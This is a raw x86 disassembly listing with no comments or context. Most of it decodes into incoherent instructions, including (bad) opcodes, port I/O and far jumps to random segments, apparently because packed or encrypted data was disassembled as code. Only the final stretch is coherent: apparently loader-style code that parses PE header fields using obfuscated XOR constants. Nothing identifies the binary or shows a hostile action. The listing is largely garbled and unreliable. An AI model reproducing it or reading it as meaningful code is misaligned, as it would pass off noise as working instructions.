  41f1b1:	adc    DWORD PTR [ecx-0x2906dafc],esi
  41f1b7:	rcl    DWORD PTR ds:0xc01acf21,1
  41f1bd:	outs   dx,BYTE PTR ds:[esi]
  41f1be:	out    dx,al
  41f1bf:	push   edx
  41f1c0:	push   esi
  41f1c1:	sbb    al,0xa0
  41f1c3:	add    eax,esp
  41f1c5:	dec    edx
  41f1c6:	in     al,0xcb
  41f1c8:	pusha  
  41f1c9:	mov    ebp,DWORD PTR [edi+0x748b47f7]
  41f1cf:	call   0x2dcc:0xb7cc777c
  41f1d6:	pop    edi
  41f1d7:	mov    BYTE PTR [ebp+ecx*1-0x55],cl
  41f1db:	repz daa 
  41f1dd:	test   eax,0x7668a63d
  41f1e2:	xchg   esi,eax
  41f1e3:	out    0x40,al
  41f1e5:	ds jno 0x41f25d
  41f1e8:	sbb    BYTE PTR [esi+0x3fe6738],0x16
  41f1ef:	jp     0x41f240
  41f1f1:	gs sub ah,bh
  41f1f4:	out    dx,al
  41f1f5:	cmp    ebx,DWORD PTR [ecx+edx*8+0x4e]
  41f1f9:	pop    esi
  41f1fa:	bound  edi,QWORD PTR [esp+esi*2-0x59718461]
  41f201:	mov    ss,WORD PTR [edx]
  41f203:	pop    esi
  41f204:	pop    ds
  41f205:	mov    eax,ds:0xc9f7834b
  41f20a:	neg    DWORD PTR [eax]
  41f20c:	xor    al,0x6d
  41f20e:	push   es
  41f20f:	gs sbb al,0x48
  41f212:	cdq    
  41f213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f214:	pmullw mm4,QWORD PTR [ecx]
  41f217:	and    eax,0xe33d23df
  41f21c:	(bad)  
  41f21e:	adc    eax,0x11f0eb21
  41f223:	fisubr DWORD PTR [edx-0x5e386ae6]
  41f229:	loop   0x41f1d4
  41f22b:	pop    esp
  41f22c:	cld    
  41f22d:	int    0xd7
  41f22f:	dec    esp
  41f230:	mov    ebx,0x6fced79c
  41f235:	sbb    BYTE PTR [esi-0x79],0xf
  41f239:	mov    bl,0xd4
  41f23b:	push   ebx
  41f23c:	jecxz  0x41f1cf
  41f23e:	xor    al,0xbe
  41f240:	pop    esi
  41f241:	aam    0xd
  41f243:	sub    BYTE PTR [edi-0x6aa7237c],cl
  41f249:	cmp    DWORD PTR [ebx],edi
  41f24b:	sbb    BYTE PTR [ebp+0x4dcc9afd],cl
  41f251:	mov    ch,0x27
  41f253:	cmp    al,0x44
  41f255:	mov    al,0x38
  41f257:	ret    0x74a5
  41f25a:	(bad)
  41f25d:	(bad)  
  41f25e:	cmp    al,0x4
  41f260:	inc    ebx
  41f261:	jae    0x41f1f5
  41f263:	push   edx
  41f264:	(bad)  
  41f265:	push   edx
  41f266:	lods   al,BYTE PTR ds:[esi]
  41f267:	pop    ecx
  41f268:	xchg   ebx,eax
  41f269:	jb     0x41f1ff
  41f26b:	cmp    dl,BYTE PTR [edi+ebp*2-0xf]
  41f26f:	dec    esp
  41f270:	fist   DWORD PTR [esi-0x79b5f1d6]
  41f276:	pop    ebp
  41f277:	fidiv  WORD PTR ds:0xa27cbe11
  41f27d:	aaa    
  41f27e:	rcl    BYTE PTR cs:[ebp-0x34],1
  41f282:	sbb    ah,cl
  41f284:	xchg   esi,eax
  41f285:	es adc eax,0x7c25738c
  41f28b:	jge    0x41f248
  41f28d:	pop    eax
  41f28e:	add    eax,ebx
  41f290:	mov    BYTE PTR [esi],0x9c
  41f293:	es cwde 
  41f295:	push   ebp
  41f296:	imul   BYTE PTR [edi+0x33]
  41f299:	or     ecx,DWORD PTR [edx-0x2bbb31f5]
  41f29f:	push   ds
  41f2a0:	and    dh,BYTE PTR [esi+edx*2-0x5e]
  41f2a4:	mov    dl,BYTE PTR [ebx]
  41f2a6:	repz or eax,0x1237b564
  41f2ac:	sub    ecx,DWORD PTR [esi+0x67]
  41f2af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2b0:	cmp    ch,BYTE PTR [esi]
  41f2b2:	mov    DWORD PTR [ebx-0x65],edi
  41f2b5:	cwde   
  41f2b6:	dec    esp
  41f2b7:	mov    al,ds:0x842cbfad
  41f2bc:	fst    QWORD PTR [esi-0x1b]
  41f2bf:	loop   0x41f33a
  41f2c1:	jnp    0x41f324
  41f2c3:	cmc    
  41f2c4:	shr    DWORD PTR [esi-0x6f],1
  41f2c7:	pop    ecx
  41f2c8:	aaa    
  41f2c9:	stc    
  41f2ca:	inc    ebx
  41f2cb:	push   edx
  41f2cc:	dec    ebp
  41f2cd:	and    al,0x10
  41f2cf:	push   esi
  41f2d0:	mov    ecx,0x39d5f437
  41f2d5:	mov    esi,0xd1519579
  41f2da:	pop    ebx
  41f2db:	mov    bh,BYTE PTR [esi+0x5dc832c]
  41f2e1:	das    
  41f2e2:	xchg   ebx,eax
  41f2e3:	cmp    eax,0x7439c418
  41f2e8:	popf   
  41f2e9:	sub    eax,DWORD PTR [edi-0x78c8c84e]
  41f2ef:	xchg   DWORD PTR [edx],ebx
  41f2f1:	jbe    0x41f2d2
  41f2f3:	add    DWORD PTR [edi+0x7b],ebx
  41f2f6:	sbb    al,0x8a
  41f2f8:	sti    
  41f2f9:	fcom   QWORD PTR [ecx]
  41f2fb:	addr16 or al,dh
  41f2fe:	or     cl,BYTE PTR [edx]
  41f300:	push   ss
  41f301:	dec    edx
  41f302:	pushf  
  41f303:	ffreep st(2)
  41f305:	les    esi,FWORD PTR [esi]
  41f307:	lds    edi,FWORD PTR [eax-0x4f]
  41f30a:	inc    esi
  41f30b:	in     al,dx
  41f30c:	jl     0x41f291
  41f30e:	xchg   edx,eax
  41f30f:	rol    BYTE PTR [ecx],0x61
  41f312:	jae    0x41f2ca
  41f314:	es stos BYTE PTR es:[edi],al
  41f316:	enter  0x10bc,0x83
  41f31a:	xlat   BYTE PTR ds:[ebx]
  41f31b:	and    al,0x75
  41f31d:	adc    DWORD PTR [edx+0x4b],esp
  41f320:	xor    eax,0xb64d4a12
  41f325:	stos   BYTE PTR es:[edi],al
  41f326:	jb     0x41f2b9
  41f328:	pop    di
  41f32a:	sub    eax,0x11922274
  41f32f:	push   eax
  41f330:	dec    eax
  41f331:	inc    esi
  41f332:	loop   0x41f399
  41f334:	jae    0x41f388
  41f336:	pop    esi
  41f337:	xchg   edx,eax
  41f338:	xor    BYTE PTR [esi-0x71],bl
  41f33b:	adc    eax,0x7341d640
  41f340:	jmp    0xa2c7:0x6322dd7a
  41f347:	cmp    ah,cl
  41f349:	outs   dx,DWORD PTR ds:[esi]
  41f34a:	popa   
  41f34b:	pop    ss
  41f34c:	jmp    0x41f2ff
  41f34e:	jmp    0xd168:0x9ec5f400
  41f355:	loop   0x41f2fc
  41f357:	into   
  41f358:	rcr    BYTE PTR [edx],0xba
  41f35b:	sbb    eax,0x2a79b91a
  41f360:	out    0xdc,al
  41f362:	xchg   esp,eax
  41f363:	xor    al,0xd
  41f365:	sbb    edx,eax
  41f367:	xchg   BYTE PTR [edi-0x2e],ch
  41f36a:	xchg   edi,eax
  41f36b:	xor    DWORD PTR [di-0x70e],eax
  41f370:	loop   0x41f3c0
  41f372:	sub    DWORD PTR es:[ecx],ebx
  41f375:	popa   
  41f376:	aam    0xf7
  41f378:	inc    ebx
  41f379:	sbb    eax,0x872db7af
  41f37e:	lods   al,BYTE PTR ds:[esi]
  41f37f:	out    dx,eax
  41f380:	addr16 in eax,dx
  41f382:	or     ecx,DWORD PTR [ecx-0x6fedad0f]
  41f388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f389:	inc    esp
  41f38a:	jecxz  0x41f368
  41f38c:	xchg   ebp,eax
  41f38d:	in     al,0xbe
  41f38f:	push   0x19
  41f391:	add    esp,DWORD PTR [edx]
  41f393:	add    ah,bh
  41f395:	and    dl,dl
  41f397:	jns    0x41f319
  41f399:	mov    cs,ebp
  41f39b:	popa   
  41f39c:	xchg   ebx,eax
  41f39d:	outs   dx,BYTE PTR ds:[esi]
  41f39e:	sbb    esp,DWORD PTR [eax+eiz*1-0x5c]
  41f3a2:	js     0x41f420
  41f3a4:	aaa    
  41f3a5:	js     0x41f3cd
  41f3a7:	iret   
  41f3a8:	outs   dx,DWORD PTR ds:[esi]
  41f3a9:	pop    ebx
  41f3aa:	inc    eax
  41f3ab:	bound  esi,QWORD PTR [ebx]
  41f3ad:	or     ebp,DWORD PTR [esi+0x3d]
  41f3b0:	and    al,0xfe
  41f3b2:	jne    0x41f34a
  41f3b4:	mov    dh,BYTE PTR [ecx+0x51]
  41f3b7:	mov    ds:0x8251088d,al
  41f3bc:	(bad)  
  41f3bd:	out    dx,al
  41f3be:	ja     0x41f3fc
  41f3c0:	ror    BYTE PTR [ecx+0x2a],1
  41f3c3:	(bad)
  41f3c6:	and    eax,0x17ffc6ed
  41f3cb:	outs   dx,DWORD PTR ds:[esi]
  41f3cc:	fwait
  41f3cd:	pushf  
  41f3ce:	cmp    al,0x63
  41f3d0:	pop    ss
  41f3d1:	aas    
  41f3d2:	out    dx,al
  41f3d3:	sahf   
  41f3d4:	pop    ecx
  41f3d5:	test   BYTE PTR ds:0x503204b9,0x67
  41f3dc:	stos   BYTE PTR es:[edi],al
  41f3dd:	mov    eax,0xceced31c
  41f3e2:	and    DWORD PTR [esi+0x53],esi
  41f3e5:	inc    ecx
  41f3e6:	scas   eax,DWORD PTR es:[edi]
  41f3e7:	jns    0x41f378
  41f3e9:	xchg   ebx,eax
  41f3ea:	xor    DWORD PTR [edx+0x3b],edi
  41f3ed:	ss lahf 
  41f3ef:	xlat   BYTE PTR ds:[ebx]
  41f3f0:	scas   al,BYTE PTR es:[edi]
  41f3f1:	sub    DWORD PTR [ebp+ecx*2+0x7f5239c8],edi
  41f3f8:	adc    edi,DWORD PTR [edi-0x53f9b433]
  41f3fe:	push   cs
  41f3ff:	adc    eax,0x205bca18
  41f404:	lods   al,BYTE PTR es:[esi]
  41f406:	jb     0x41f393
  41f408:	test   DWORD PTR [eax+eax*4+0x7891e3bd],ebp
  41f40f:	in     al,dx
  41f410:	dec    ecx
  41f411:	jmp    DWORD PTR [edi-0x1a]
  41f414:	adc    ebx,DWORD PTR [esi]
  41f416:	cmp    al,BYTE PTR [edx]
  41f418:	mov    ch,BYTE PTR ds:0xafafb1be
  41f41e:	outs   dx,DWORD PTR ss:[esi]
  41f420:	test   eax,0xedb5e7d8
  41f425:	ss jmp 0x41f486
  41f428:	(bad)  
  41f429:	sub    ah,BYTE PTR [ebx+0x74]
  41f42c:	push   cs
  41f42d:	lds    eax,FWORD PTR [ebx+0x14]
  41f430:	(bad)  [ecx]
  41f432:	push   ebp
  41f433:	xor    bl,bh
  41f435:	mov    bl,BYTE PTR [ecx-0x34ba84b5]
  41f43b:	jmp    0x41f3c0
  41f43d:	(bad)  
  41f43e:	or     al,0x2a
  41f440:	sub    edi,DWORD PTR [esp+ecx*4+0x53]
  41f444:	loop   0x41f446
  41f446:	xor    edx,DWORD PTR [ecx-0x16]
  41f449:	test   al,0x95
  41f44b:	fcomp  QWORD PTR [esi+0x30]
  41f44e:	cmp    al,0x4b
  41f450:	pop    ecx
  41f451:	nop
  41f452:	repnz (bad) 
  41f456:	xor    BYTE PTR [edi-0xb],bh
  41f459:	shl    ebp,cl
  41f45b:	inc    ecx
  41f45c:	arpl   WORD PTR [esi+0xa757043],di
  41f462:	pop    edx
  41f463:	push   0xffffffe5
  41f465:	cmp    BYTE PTR [esi-0x17],ch
  41f468:	xchg   dh,dl
  41f46a:	(bad)  
  41f46b:	cwde   
  41f46c:	sbb    eax,0x8085cf81
  41f471:	pcmpeqb mm2,mm5
  41f474:	pop    esp
  41f475:	pop    esi
  41f476:	mov    ds:0x8d6e0c9,eax
  41f47b:	adc    ecx,esp
  41f47d:	mov    ds:0xdb7348bb,al
  41f482:	(bad)  
  41f483:	pop    ebp
  41f484:	mov    ebp,0x4cb36d62
  41f489:	shl    ch,0x49
  41f48c:	xor    eax,0xa2ade47
  41f491:	pusha  
  41f492:	mov    ds:0xeb3d78cf,al
  41f497:	inc    eax
  41f498:	addr16 call 0xc96b0182
  41f49e:	push   eax
  41f49f:	push   esp
  41f4a0:	(bad)  
  41f4a1:	int3   
  41f4a2:	push   ebp
  41f4a3:	bound  edi,QWORD PTR [edx]
  41f4a5:	pop    es
  41f4a6:	mov    ecx,0x4f7b06a0
  41f4ab:	test   al,0x1d
  41f4ad:	push   ebp
  41f4ae:	dec    esp
  41f4af:	pop    edi
  41f4b0:	jbe    0x41f497
  41f4b2:	cmc    
  41f4b3:	mov    ah,0x35
  41f4b5:	add    eax,0xc5d27125
  41f4ba:	imul   eax,DWORD PTR [eax+0x1f],0xffffffd5
  41f4be:	lea    esp,[ebx+0x3c20e2c0]
  41f4c4:	test   eax,0x21712dc0
  41f4c9:	adc    BYTE PTR [ecx-0x5761b56f],ah
  41f4cf:	sub    BYTE PTR [eax+ebp*4-0x54ad14af],cl
  41f4d6:	je     0x41f4e0
  41f4d8:	xchg   esp,eax
  41f4d9:	int    0x62
  41f4db:	jae    0x41f4cf
  41f4dd:	push   esp
  41f4de:	int3   
  41f4df:	adc    ecx,esp
  41f4e1:	mov    esi,0x19dd67c8
  41f4e6:	ficomp DWORD PTR [ecx+0x5]
  41f4e9:	das    
  41f4ea:	popf   
  41f4eb:	ss inc ebx
  41f4ed:	mov    esp,0x8f43718b
  41f4f2:	mov    bl,0x1f
  41f4f4:	push   edi
  41f4f5:	adc    BYTE PTR [ebx],ch
  41f4f7:	adc    ebx,DWORD PTR [eax+0x1b2b213f]
  41f4fd:	mov    dh,0xb0
  41f4ff:	jne    0x41f4f8
  41f501:	and    bh,cl
  41f503:	test   BYTE PTR [edx-0x20347e37],cl
  41f509:	repz sub ecx,DWORD PTR [ebx-0x325f8bf1]
  41f510:	jmp    0x5752bdf7
  41f515:	scas   al,BYTE PTR es:[edi]
  41f516:	lea    esi,[eax+0x305dd97d]
  41f51c:	dec    edi
  41f51d:	or     ecx,DWORD PTR ds:0xe61d8a97
  41f523:	and    esi,esp
  41f525:	xchg   BYTE PTR [esi+0x6f],bh
  41f528:	xchg   ebp,eax
  41f529:	or     edx,DWORD PTR [edx-0x48c37068]
  41f52f:	xor    ecx,DWORD PTR [edi+0x79736d2f]
  41f535:	je     0x41f4bd
  41f537:	pop    edi
  41f538:	js     0x41f529
  41f53a:	push   0x5
  41f53c:	ds jg  0x41f4eb
  41f53f:	add    eax,0x59457736
  41f544:	jecxz  0x41f4f1
  41f546:	js     0x41f4cc
  41f548:	nop
  41f549:	push   cs
  41f54a:	jb     0x41f56e
  41f54c:	scas   al,BYTE PTR es:[edi]
  41f54d:	pop    esp
  41f54e:	es stos DWORD PTR es:[edi],eax
  41f550:	(bad)  
  41f551:	fst    QWORD PTR [ebx+0x4d]
  41f554:	sub    al,0x7c
  41f556:	ret    0x769
  41f559:	xchg   esp,ebx
  41f55b:	cld    
  41f55c:	push   esi
  41f55d:	inc    ebx
  41f55e:	add    al,0xa7
  41f560:	cmp    BYTE PTR [edi+0x11d40403],dl
  41f566:	fwait
  41f567:	lods   eax,DWORD PTR ds:[esi]
  41f568:	and    eax,0x576acb3c
  41f56d:	or     edx,esi
  41f56f:	cmp    BYTE PTR [ebx],bl
  41f571:	inc    ecx
  41f572:	pop    ecx
  41f573:	fcom   DWORD PTR [esi+0x38]
  41f576:	xchg   ecx,eax
  41f577:	inc    ecx
  41f578:	fnstenv [edx]
  41f57a:	pusha  
  41f57b:	dec    esp
  41f57c:	push   ebp
  41f57d:	sahf   
  41f57e:	out    dx,eax
  41f57f:	inc    ecx
  41f580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f581:	inc    ecx
  41f582:	lahf   
  41f583:	ss scas al,BYTE PTR es:[edi]
  41f585:	xchg   edx,eax
  41f586:	sahf   
  41f587:	pop    edi
  41f588:	xlat   BYTE PTR ds:[ebx]
  41f589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f58a:	push   cs
  41f58b:	push   ds
  41f58c:	test   eax,0xebc1769c
  41f591:	and    dh,BYTE PTR [ebp+0x58325347]
  41f597:	dec    ebx
  41f598:	add    ecx,DWORD PTR [ebp+0x5019fff7]
  41f59e:	(bad)
  41f5a3:	mov    dh,0x7e
  41f5a5:	lahf   
  41f5a6:	lods   eax,DWORD PTR ds:[esi]
  41f5a7:	sub    DWORD PTR [ecx],esp
  41f5a9:	cmp    eax,DWORD PTR [esp+esi*2]
  41f5ac:	(bad)  
  41f5ad:	scas   eax,DWORD PTR es:[edi]
  41f5ae:	cmp    ah,0xad
  41f5b1:	pop    eax
  41f5b2:	lods   al,BYTE PTR ds:[esi]
  41f5b3:	call   0x4841:0xacccc3e4
  41f5ba:	jae    0x41f620
  41f5bc:	inc    ebp
  41f5bd:	pop    eax
  41f5be:	int    0x2a
  41f5c0:	retf   
  41f5c1:	aas    
  41f5c2:	jae    0x41f5ef
  41f5c4:	inc    edx
  41f5c5:	jmp    0x57574a2c
  41f5ca:	movlps xmm6,QWORD PTR [ecx-0x75d458e6]
  41f5d1:	jecxz  0x41f647
  41f5d3:	pop    es
  41f5d4:	mov    al,0xe0
  41f5d6:	leave  
  41f5d7:	nop    edx
  41f5da:	jle    0x41f5f8
  41f5dc:	hlt    
  41f5dd:	push   ecx
  41f5de:	pop    es
  41f5df:	or     ah,BYTE PTR [ecx]
  41f5e1:	jmp    0xd203:0x3337c826
  41f5e8:	and    al,bl
  41f5ea:	dec    esi
  41f5eb:	pop    es
  41f5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5ed:	scas   al,BYTE PTR es:[edi]
  41f5ee:	sub    BYTE PTR [ecx-0x1c54182],0x8e
  41f5f5:	push   ecx
  41f5f6:	in     eax,dx
  41f5f7:	mov    bl,0xb6
  41f5f9:	xor    al,0x38
  41f5fb:	sub    bh,BYTE PTR [edi]
  41f5fd:	imul   edx,DWORD PTR [eax-0x7c1ed9cb],0xf5ceb74e
  41f607:	mov    ecx,0xc0c4c92
  41f60c:	sbb    eax,0x77f223c1
  41f611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f612:	sub    BYTE PTR [esi+0x6c],ah
  41f615:	xor    BYTE PTR [esi-0x7525e494],dh
  41f61b:	inc    edi
  41f61c:	xor    DWORD PTR [ecx],esp
  41f61e:	and    al,0x9a
  41f620:	ret    
  41f621:	xor    edx,DWORD PTR [edx]
  41f623:	stc    
  41f624:	or     dl,BYTE PTR [edi+ebx*4+0x37]
  41f628:	cmp    BYTE PTR ds:0x2580cab4,dh
  41f62e:	leave  
  41f62f:	xlat   BYTE PTR ds:[ebx]
  41f630:	xchg   dh,dl
  41f632:	mov    DWORD PTR [edi],esp
  41f634:	lock xchg esi,eax
  41f636:	loopne 0x41f63e
  41f638:	or     cl,BYTE PTR [esi+ecx*2]
  41f63b:	call   0xf346:0xf0e6df59
  41f642:	add    eax,0xdecc67b9
  41f647:	adc    DWORD PTR [esi],0xe76e3ffe
  41f64d:	loope  0x41f5f5
  41f64f:	(bad)  [ebp+0x16]
  41f652:	(bad)  
  41f653:	jmp    0x89fb24f4
  41f658:	inc    edi
  41f659:	xlat   BYTE PTR ds:[ebx]
  41f65a:	sub    ebx,DWORD PTR [ebp+esi*8-0x5f]
  41f65e:	xor    eax,0x3950b065
  41f663:	mov    ch,BYTE PTR [edx]
  41f665:	aad    0x48
  41f667:	fstp   TBYTE PTR [ebp+0x4992af92]
  41f66d:	pop    ss
  41f66e:	jp     0x41f6e7
  41f670:	adc    al,0xdf
  41f672:	pop    ebx
  41f673:	sub    al,0x85
  41f675:	mov    ecx,0x3f27c5b0
  41f67a:	fisub  DWORD PTR [edx]
  41f67c:	stc    
  41f67d:	and    ch,dl
  41f67f:	aam    0xc6
  41f681:	scas   al,BYTE PTR es:[edi]
  41f682:	mov    dl,0x9d
  41f684:	xor    eax,0x6045b89e
  41f689:	mov    dl,0xa5
  41f68b:	out    dx,al
  41f68c:	lods   eax,DWORD PTR ds:[esi]
  41f68d:	(bad)  
  41f68e:	lock dec edi
  41f690:	add    BYTE PTR [ebx+eax*4],bl
  41f693:	and    eax,0xb963d48b
  41f698:	add    DWORD PTR [ebp+eax*2-0x7b0076c2],edx
  41f69f:	clc    
  41f6a0:	push   ebx
  41f6a1:	and    eax,0xbcb7fa29
  41f6a6:	dec    eax
  41f6a7:	pop    es
  41f6a8:	sub    eax,0xab5484cf
  41f6ad:	out    dx,al
  41f6ae:	(bad)  
  41f6af:	lea    eax,[ecx+0x79]
  41f6b2:	leave  
  41f6b3:	adc    dh,BYTE PTR [ebp-0x2f8e7480]
  41f6b9:	daa    
  41f6ba:	add    DWORD PTR [ebx+0x51f8da1d],esp
  41f6c0:	ror    BYTE PTR [ecx],1
  41f6c2:	dec    ecx
  41f6c3:	in     eax,0x10
  41f6c5:	jmp    0x98e9313
  41f6ca:	sbb    esi,edx
  41f6cc:	push   ecx
  41f6cd:	retf   
  41f6ce:	(bad)  
  41f6d0:	loopne 0x41f73b
  41f6d2:	imul   eax,ebx,0xffffff98
  41f6d5:	cmp    ch,BYTE PTR [ecx]
  41f6d7:	dec    esi
  41f6d8:	rcl    DWORD PTR [edi],1
  41f6da:	daa    
  41f6db:	(bad)  
  41f6dc:	and    al,0xfb
  41f6de:	dec    ebp
  41f6df:	pop    esi
  41f6e0:	mov    ebx,0xfa86730a
  41f6e5:	xor    eax,0xf0b06689
  41f6ea:	inc    edx
  41f6eb:	shl    BYTE PTR [edi-0x4394dcf9],cl
  41f6f1:	jae    0x41f6a7
  41f6f3:	adc    cl,BYTE PTR [ebx-0x48a1caed]
  41f6f9:	inc    ebx
  41f6fa:	cdq    
  41f6fb:	push   ss
  41f6fc:	xor    edi,DWORD PTR [edi+0x446a90f5]
  41f702:	pop    edx
  41f703:	cmp    BYTE PTR [ebx+0x2a],0x74
  41f707:	xor    DWORD PTR [bx+0x487b],ecx
  41f70c:	shl    BYTE PTR [ecx+0x4a],0xc0
  41f710:	xchg   esi,eax
  41f711:	cmp    BYTE PTR [ebx+0x8],al
  41f714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f715:	and    esi,esp
  41f717:	dec    edi
  41f718:	fwait
  41f719:	xchg   ebp,eax
  41f71a:	xchg   esi,eax
  41f71b:	fnstcw WORD PTR [ecx-0x5f]
  41f71e:	sbb    ecx,ecx
  41f720:	(bad)  
  41f721:	jno    0x41f6d7
  41f723:	sub    eax,0x63f3923f
  41f728:	dec    edi
  41f729:	ret    
  41f72a:	xor    BYTE PTR [ecx+0x56],0x1
  41f72e:	dec    esi
  41f72f:	fiadd  WORD PTR [ebp-0x54b6c963]
  41f735:	lahf   
  41f736:	daa    
  41f737:	xor    DWORD PTR [edi+eax*1],edx
  41f73a:	(bad)  
  41f73b:	mov    DWORD PTR [ebp+0x1c],ebp
  41f73e:	sbb    ch,cl
  41f740:	cwde   
  41f741:	xchg   edi,eax
  41f742:	mov    eax,0x48155b5b
  41f747:	in     al,dx
  41f748:	lahf   
  41f749:	inc    edx
  41f74a:	dec    esp
  41f74b:	push   esp
  41f74c:	int3   
  41f74d:	mov    ecx,0xa8a67b68
  41f752:	in     eax,0x49
  41f754:	pop    ebx
  41f755:	lods   eax,DWORD PTR ds:[esi]
  41f756:	jb     0x41f729
  41f758:	shr    BYTE PTR [ecx+edx*4+0x20],0x8e
  41f75d:	fwait
  41f75e:	les    ebp,FWORD PTR [esi-0x23]
  41f761:	jne    0x41f730
  41f763:	cs cs mov cl,0x35
  41f767:	js     0x41f6f5
  41f769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f76a:	aad    0xb9
  41f76c:	jno    0x41f7d9
  41f76e:	jl     0x41f77f
  41f770:	ins    DWORD PTR es:[edi],dx
  41f771:	mov    DWORD PTR [edx],esi
  41f773:	js     0x41f74d
  41f775:	sbb    al,0x9d
  41f777:	push   eax
  41f778:	sahf   
  41f779:	daa    
  41f77a:	inc    ebp
  41f77b:	pop    esp
  41f77c:	jne    0x41f73b
  41f77e:	ds or  eax,0xf1cd03d9
  41f784:	je     0x41f722
  41f786:	(bad)  
  41f787:	cld    
  41f788:	add    edi,DWORD PTR [eax]
  41f78a:	(bad)  
  41f78b:	sub    al,0x3e
  41f78d:	dec    ebp
  41f78e:	fadd   DWORD PTR [ebp-0x6c9a7b40]
  41f794:	cld    
  41f795:	in     eax,dx
  41f796:	mov    eax,ds:0xb2664eb0
  41f79b:	aaa    
  41f79c:	adc    BYTE PTR [ebx+0xd0097ec],cl
  41f7a2:	(bad)  
  41f7a3:	xor    BYTE PTR [ebp-0x57],al
  41f7a6:	inc    esi
  41f7a7:	push   ebp
  41f7a8:	pop    edx
  41f7a9:	sub    al,0x69
  41f7ab:	pop    es
  41f7ac:	shr    DWORD PTR [edi+0x37a21404],0x8e
  41f7b3:	dec    esi
  41f7b4:	mov    esp,0xb7a29a78
  41f7b9:	push   eax
  41f7ba:	jmp    0x41f746
  41f7bc:	jns    0x41f800
  41f7be:	xchg   ecx,eax
  41f7bf:	ficom  WORD PTR [edx-0x48]
  41f7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7c3:	das    
  41f7c4:	out    dx,al
  41f7c5:	ja     0x41f7db
  41f7c7:	arpl   WORD PTR [eax-0x794d0d89],bp
  41f7cd:	ja     0x41f81f
  41f7cf:	sbb    ebx,DWORD PTR [eax+ebx*4+0x11]
  41f7d3:	add    al,0x21
  41f7d5:	jno    0x41f851
  41f7d7:	das    
  41f7d8:	xlat   BYTE PTR ds:[ebx]
  41f7d9:	mov    ah,BYTE PTR [edi-0x3d237c20]
  41f7df:	sub    DWORD PTR [eax-0x71],ebx
  41f7e2:	out    0xbc,eax
  41f7e4:	sti    
  41f7e5:	or     edx,DWORD PTR [edx+0x54a2f404]
  41f7eb:	call   0xa085:0xed504aab
  41f7f2:	outs   dx,DWORD PTR ds:[esi]
  41f7f3:	repz and DWORD PTR [ecx+0x51],edx
  41f7f7:	xchg   ecx,eax
  41f7f8:	push   eax
  41f7f9:	push   edx
  41f7fa:	(bad)  
  41f7fb:	xchg   ebx,eax
  41f7fc:	jo     0x41f812
  41f7fe:	jl     0x41f832
  41f800:	arpl   WORD PTR [ecx],bx
  41f802:	js     0x41f871
  41f804:	(bad)  
  41f805:	idiv   DWORD PTR [edi-0x2f]
  41f808:	(bad)  
  41f809:	retf   0x5111
  41f80c:	out    0xa0,al
  41f80e:	(bad)  
  41f80f:	sbb    BYTE PTR [eax],dh
  41f811:	adc    DWORD PTR [ebp+0x2c10ab1c],esp
  41f817:	mov    WORD PTR [ecx-0x72061d5e],gs
  41f81d:	sbb    DWORD PTR [ecx-0x31],ebp
  41f820:	es cmc 
  41f822:	jmp    0x18a0:0x6c77585a
  41f829:	ins    DWORD PTR es:[edi],dx
  41f82a:	dec    esp
  41f82b:	pop    DWORD PTR [ecx+eiz*2]
  41f82e:	cmp    al,0x20
  41f830:	inc    ebp
  41f831:	pop    edi
  41f832:	out    dx,al
  41f833:	xor    ebp,DWORD PTR [edx]
  41f835:	dec    esp
  41f836:	mov    BYTE PTR [edi-0x67f66aca],0x60
  41f83d:	outs   dx,DWORD PTR ds:[esi]
  41f83e:	cmp    eax,0xa9e2ce27
  41f843:	sbb    eax,0xc6619bee
  41f848:	add    esi,DWORD PTR [eax]
  41f84a:	add    ah,BYTE PTR [edx+0x5974c886]
  41f850:	add    cl,BYTE PTR [esi]
  41f852:	in     al,dx
  41f853:	mov    edi,0x2ab9b1e8
  41f858:	pop    ebx
  41f859:	xor    ecx,edi
  41f85b:	jmp    0xfeb20d8c
  41f860:	out    0x98,eax
  41f862:	lock and al,0x5e
  41f865:	ds xor al,0x47
  41f868:	mov    edx,0x970858a5
  41f86d:	cmp    DWORD PTR es:[edi+0x4eff1c54],0xffffff96
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d55
  41f8e9:	mov    edx,DWORD PTR ds:0x42af4d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
